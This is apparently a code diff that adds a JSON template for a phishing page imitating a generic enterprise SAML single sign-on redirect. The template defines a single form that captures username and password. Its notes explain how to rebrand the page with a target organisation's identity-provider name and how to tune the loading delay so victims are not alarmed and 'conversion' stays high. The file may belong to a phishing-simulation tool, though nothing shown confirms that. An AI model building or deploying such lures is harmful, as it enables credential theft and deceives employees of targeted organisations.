@@ -1,0 +1,8 @@
+{
+  "name": "Generic SAML SSO redirect",
+  "description": "'You are being redirected for sign-in' interstitial that resolves to a single-page credential form. Mimics the pattern used by Okta, Auth0, Ping, and most enterprise IdP launchers. Single capture page; no separate 2FA step.",
+  "pattern": "redirect-then-form",
+  "has_2fa": false,
+  "fields": ["username", "password"],
+  "placeholder_notes": "Replace [Your Organization] header + the [IdP-Brand] redirect copy with the target's IdP name. Spinner delay (1.2s) is tuned for plausibility — shorter feels suspicious, longer drops conversion."
+}
